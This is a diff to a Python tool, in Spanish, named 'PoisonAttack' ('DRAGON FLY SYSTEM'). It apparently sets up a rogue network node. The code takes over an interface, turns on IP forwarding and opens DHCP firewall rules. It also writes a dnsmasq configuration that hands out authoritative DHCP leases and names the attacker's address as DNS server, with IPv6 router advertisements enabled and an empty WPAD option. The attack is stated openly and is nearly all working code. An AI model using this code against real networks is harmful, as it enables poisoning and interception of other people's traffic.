@@ -1,4 +1,3 @@
-# poison_logic.py (versión corregida)
 import os
 import subprocess
 import time
@@ -74,7 +73,7 @@ class PoisonAttack:
 
         self.log("\n[!] DRAGON FLY SYSTEM")
         self.log(f"[*] Configurando interfaz: {iface}")
-1
+
         try:
             self.log("[*] Desvinculando interfaz de gestores de red...")
             os.system(f"sudo nmcli device set {iface} managed no 2>/dev/null")
@@ -82,12 +81,16 @@ class PoisonAttack:
             os.system(f"sudo dhcpcd -k {iface} 2>/dev/null")
             time.sleep(1)
 
-            self.log("[*] Reset de interfaz y supresión de gestores...")
+            self.log("[*] Reset de interfaz y supresión IPv6/RA...")
             os.system(f"sudo ip link set {iface} down 2>/dev/null")
             time.sleep(1)
             os.system(f"sudo ip link set {iface} up")
             time.sleep(2)
 
+            # Desactivar IPv6 para evitar esperas de SLAAC
+            #os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=1 2>/dev/null")
+            #os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.accept_ra=0 2>/dev/null")
+            #os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.autoconf=0 2>/dev/null")
 
             ip = "192.168.10.1"
             subnet_mask = "24"
@@ -99,16 +102,17 @@ class PoisonAttack:
             os.system("sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null")
             os.system(f"sudo ip route add 192.168.10.0/{subnet_mask} dev {iface} 2>/dev/null")
 
-            # Reglas de firewall para permitir DHCP
+            # ===== NUEVO: reglas de firewall para permitir DHCP =====
             self.log("[*] Configurando firewall para DHCP...")
             os.system(f"sudo iptables -A INPUT -i {iface} -p udp --dport 67 -j ACCEPT")
             os.system(f"sudo iptables -A INPUT -i {iface} -p udp --dport 68 -j ACCEPT")
             os.system(f"sudo iptables -A OUTPUT -o {iface} -p udp --sport 67 -j ACCEPT")
             os.system(f"sudo ip6tables -A INPUT -i {iface} -p icmpv6 -j ACCEPT")
             os.system(f"sudo ip6tables -A OUTPUT -o {iface} -p icmpv6 -j ACCEPT")
+            # ======================================================
 
-            os.system("rm -f /tmp/dnsmasq.leases")
-            
+            # Configuración dnsmasq (DHCP sin DNS)
+        
             config_dhcp = (
                 f"interface={iface}\n"
                 f"listen-address={ip}\n"
@@ -117,11 +121,10 @@ class PoisonAttack:
                 f"dhcp-option=6,{ip}\n"
                 f"dhcp-option=15,\n"
                 f"dhcp-option=252,\n"
-                f"bind-interfaces\n"          
-                f"dhcp-leasefile=/tmp/dnsmasq.leases\n" 
-                f"dhcp-authoritative\n"
-                f"enable-ra\n"
-                f"dhcp-range=fd00::,ra-stateless,12h\n"
+                f"bind-dynamic\n"
+                f"dhcp-authoritative\n"     # <-- acelera la asignación DHCP
+                f"enable-ra\n"              # <-- activa Router Advertisements
+                f"dhcp-range=fd00::,ra-stateless,12h\n"   # <-- rango ULA para SLAAC
                 f"no-resolv\n"
                 f"no-hosts\n"
                 f"port=0\n"
